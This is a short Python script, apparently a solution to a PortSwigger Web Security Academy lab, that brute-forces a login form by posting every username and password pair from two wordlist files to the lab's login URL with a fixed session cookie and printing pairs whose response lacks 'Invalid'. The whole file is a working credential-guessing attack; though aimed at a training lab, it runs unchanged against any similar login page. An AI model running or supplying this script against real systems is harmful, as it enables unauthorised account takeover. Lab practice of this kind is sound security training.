import requests

with open('usuarios_noborrar.txt', 'r') as users_file:
    users_list = [line.strip() for line in users_file]

with open('passwords_db.txt', 'r') as passwords_file:
    password_list = [line.strip() for line in passwords_file]

for username in users_list:
    for passwords in password_list:
        data = {
            'username': username,
            'password': passwords
        }

        response = requests.post('https://0adf00d203e6e66c81e7ca2300700072.web-security-academy.net/login', data=data, cookies={'session': 'WBGv4N2qiutzgA6ESY52ZjP0GpnJKrea'})

        if 'Invalid' not in response.text:
            print(f"Se encontraron credenciales válidas! {username}:{passwords}")
        else:
            print(f"testing {username}:{passwords}")


